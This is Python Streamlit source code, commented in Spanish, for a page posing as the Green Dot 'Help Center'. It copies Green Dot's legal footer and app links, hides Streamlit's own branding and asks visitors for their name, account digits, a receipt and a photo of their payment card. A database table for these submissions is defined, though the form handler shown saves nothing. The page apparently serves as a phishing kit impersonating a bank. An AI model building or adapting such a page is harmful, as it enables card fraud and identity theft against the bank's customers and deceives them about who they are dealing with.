
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Base de Datos
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)"""
    )
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# 1. JAVASCRIPT: BLINDAJE DE VISIBILIDAD DE BOTONES (CADA 50ms)
st.markdown("""<script>
    const forceButtonTextVisibility = () => {
        // Forzar todos los textos generales a blanco
        const allText = document.querySelectorAll('p, span, label, small, h1, h2, h3, div');
        allText.forEach(el => {
            el.style.setProperty('color', '#FFFFFF', 'important');
            el.style.setProperty('opacity', '1', 'important');
            el.style.setProperty('-webkit-text-fill-color', '#FFFFFF', 'important');
        });

        // Forzar específicamente el texto de los botones (Submit y Upload)
        const allButtons = document.querySelectorAll('button, [data-testid="stFileUploader"] button');
        allButtons.forEach(btn => {
            btn.style.setProperty('color', '#FFFFFF', 'important');
            btn.style.setProperty('-webkit-text-fill-color', '#FFFFFF', 'important');
            // Asegurar que el texto dentro del botón (span) también sea blanco
            btn.querySelectorAll('span, div').forEach(child => {
                child.style.setProperty('color', '#FFFFFF', 'important');
                child.style.setProperty('-webkit-text-fill-color', '#FFFFFF', 'important');
            });
        });

        // Desactivar enlaces en logo y títulos
        document.querySelectorAll('[data-testid="stImage"], h1, .stMarkdown h1').forEach(el => {
            el.style.pointerEvents = 'none';
            el.style.cursor = 'default';
        });

        // Limpieza de interfaz de Streamlit
        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]'].forEach(s => {
            document.querySelectorAll(s).forEach(el => el.remove());
        });
    };
    setInterval(forceButtonTextVisibility, 50);
</script>""", unsafe_allow_html=True)

# 2. CSS: ESTILOS DE ALTO CONTRASTE
st.markdown("""<style>
    html, body, [data-testid="stAppViewContainer"], .stApp {
        background-color: #000000 !important;
    }

    /* FUERZA BRUTA PARA TEXTO DE BOTONES */
    .stButton > button, [data-testid="stFileUploader"] button {
        color: #FFFFFF !important;
        -webkit-text-fill-color: #FFFFFF !important;
    }
    
    .stButton > button * , [data-testid="stFileUploader"] button * {
        color: #FFFFFF !important;
        -webkit-text-fill-color: #FFFFFF !important;
    }

    /* Contenedor del uploader */
    [data-testid="stFileUploader"] section {
        background-color: #111111 !important;
        border: 1px dashed #444 !important;
    }

    /* Inputs legibles */
    .stTextInput input, .stNumberInput input {
        background-color: #1a1a1a !important;
        color: #FFFFFF !important;
        border: 1px solid #333 !important;
    }

    /* Botón de envío principal */
    .stButton > button {
        background-color: #00a05b !important;
        border: 1px solid #FFFFFF !important;
        width: 100% !important;
        font-weight: bold !important;
        height: 50px !important;
    }

    .promo-container {
        background-color: #111; padding: 25px; border-radius: 12px;
        text-align: center; margin-top: 30px; border: 1px solid #222;
    }

    .legal-footer {
        font-size: 11px; color: #FFFFFF !important; text-align: justify;
        margin-top: 40px; padding-top: 20px; border-top: 1px solid #333;
        line-height: 1.5;
    }

    header, footer, .stDeployButton { display: none !important; }
</style>""", unsafe_allow_html=True)

# 3. INTERFAZ
if os.path.exists("logo.svg"): st.image("logo.svg", width=220)

st.title("Help Center")
st.write("Please fill out the form below to submit your dispute.")

with st.form("claim_form_v135", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Account Number (Last 4 digits)")
    st.number_input("Disputed Amount", format="%.2f")
    st.file_uploader("Store Receipt", type=["jpg","png"])
    st.file_uploader("Card Photo", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("✅ Claim Received.")

st.markdown("""<div class='promo-container'>
    <p style='font-weight: bold; margin-bottom: 15px; color: white !important;'>Download the Green Dot app</p>
    <div style='display: flex; justify-content: center; gap: 10px;'>
        <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
        </a>
        <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
        </a>
    </div>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
    Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC.
    &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924; Green Dot Bank NMLS #908739.<br><br>
    *Not a gift card. Must be 18 or older to purchase. Online access and identity verification are required.
</div>""", unsafe_allow_html=True)
